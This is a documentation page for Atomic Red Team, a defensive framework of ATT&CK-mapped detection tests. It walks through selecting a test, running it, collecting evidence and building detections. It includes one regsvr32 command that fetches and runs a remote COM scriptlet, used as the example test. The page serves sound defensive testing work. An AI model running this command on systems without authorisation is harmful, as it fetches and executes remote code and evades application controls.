.. include:: links.rst

========================
Atomic Red Team
========================

**Atomic Red Team** tests are small, highly portable detection tests mapped to the MITRE ATT&CK Framework. Each test is designed to map back to a particular tactic. This gives defenders a highly actionable way to immediately start testing their defenses against a broad spectrum of attacks.

Getting Started Testing with Atomic Tests
^^^^^^^^^

We suggest a phased cyclical approach to running a test and evaluating your results:

1. Select a test
2. Execute Test
3. Collect Evidence
4. Develop Detection
5. Measure Progress

Best Practices
^^^^^^^^^

* Be sure to get permission and necessary approval before conducting tests. Unauthorized testing is a bad decision and can potentially be a resume-generating event.

* Set up a test machine that would be similar to the build in your environment. Be sure you have your collection/EDR solution in place, and that the endpoint is checking in and active.

* Spend some time developing a test plan or scenario. This can take many forms. An example test plan could be to execute all the Discovery phase items at once in a batch file, or run each phase one by one, validating coverage as you go.

Select an Atomic Test
^^^^^^^^^

Select one or more Atomic Tests that you plan to execute. A complete list, ATT&CK matrices, and platform-specific matrices linking to Atomic Tests can be found here:

* `Complete list of Atomic Tests <https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/index.md>`_
* `Atomic Tests per the ATT&CK Matrix <https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/matrix.md>`_
* Windows `Tests <https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/windows-index.md>`_ and `Matrix <https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/windows-matrix.md>`_
* macOS `Tests <https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/macos-index.md>`_ and `Matrix <https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/macos-matrix.md>`_
* Linux `Tests <https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/linux-index.md>`_ and `Matrix <https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/linux-matrix.md>`_

Execute Test
^^^^^^^^^

In this example we will use Technique T1117 ``Regsvr32`` and Atomic Test ``Regsvr32 remote COM scriptlet execution``. This particular test is fairly easy to exercise since the tool is on all Windows workstations by default.

The details of this test, which are located here, describe how you can test your detection by simply running the below command:

From the Windows command prompt:

.. code-block:: console

    > regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll


Collect Evidence
^^^^^^^^^

What does your security solution observe?

* You may see a file modification in the user’s profile.
* You may detect network connections made by regsvr32.exe to an external IP.
* There may be an entry in the proxy logs.
* You may observe the scrobj.dll loading on Windows.
* Or you might not observe any behavior on the endpoint or network.

This is why we test! We want to identify visibility gaps and determine where we need to make improvements.

.. image:: https://www.redcanary.com/wp-content/uploads/image9-1.png

Resources
^^^^^^^^^

- :doc:`Get started <guides/index>` with Atomic Red Team
- Explore the :doc:`analytics <analytics>` that map to ATT&CK.
- Learn how to `write Atomic Tests <https://eql.readthedocs.io/query-guide>`_ in yaml
- Browse our :doc:`schemas <schemas>` and existing normalizations
- Check the :doc:`license <licenses>` status


.. toctree::
   :maxdepth: 2
   :caption: Contents

   guides/index
   analytics
   atomicblue

   matrices
   schemas

   licenses
